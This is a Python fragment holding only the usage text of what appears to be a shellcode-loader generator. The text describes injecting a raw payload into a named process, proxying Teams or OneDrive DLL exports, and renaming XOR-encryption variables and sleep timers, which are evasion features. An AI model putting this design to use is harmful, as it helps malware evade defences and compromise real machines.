import sys
# Define the usage message so that the user will now how the script works
# Documentation
def print_usage():
    print(f"Usage: {sys.argv[0]} [raw payload file] [output path] [process name] [dll_exports]\n")
    print("  [raw payload file] : Path to file containing shellcode")
    print("  [output path]      : Path to output the C template file")
    print("  [process name]     : Name of process to inject shellcode into")
    print("  [dll_exports] : Specify which DLL Exports you want to use either teams or onedrive")
    print("  [replace shellcode variable name]   : [Optional] Replace shellcode variable name with a unique name")
    print("  [replace xor encryption  name]   : [Optional] Replace xor encryption name with a unique name")
    print("  [replace key variable name]   : [Optional] Replace key variable name with a unique name")
    print("  [replace sleep time via waitable timers]   : [Optional] Replace sleep time your own sleep time")
